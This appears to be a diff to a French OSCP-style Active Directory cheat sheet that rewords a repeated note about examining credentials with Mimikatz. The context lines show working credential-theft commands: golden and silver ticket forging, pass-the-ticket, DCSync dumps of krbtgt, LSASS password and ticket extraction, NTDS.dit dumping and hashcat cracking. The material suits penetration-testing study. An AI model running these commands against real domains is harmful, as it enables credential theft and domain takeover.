@@ -166,7 +166,7 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domai
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # kerberos::ptt silver_ticket.kirbi
@@ -188,7 +188,7 @@ dir \\targetserver\sharedfolder
 **Paramètres et repères :**
 `Mimikatz`  
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
@@ -213,7 +213,7 @@ mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domai
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # kerberos::ptt golden_ticket.kirbi
@@ -256,7 +256,7 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com]
@@ -280,7 +280,7 @@ hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # privilege::debug
@@ -316,7 +316,7 @@ hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::logonpasswords
@@ -341,7 +341,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::tickets /export
@@ -1066,7 +1066,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
@@ -1315,7 +1315,7 @@ Needed to access LSASS memory where Kerberos tickets are stored.
 
 Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Examiner les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz
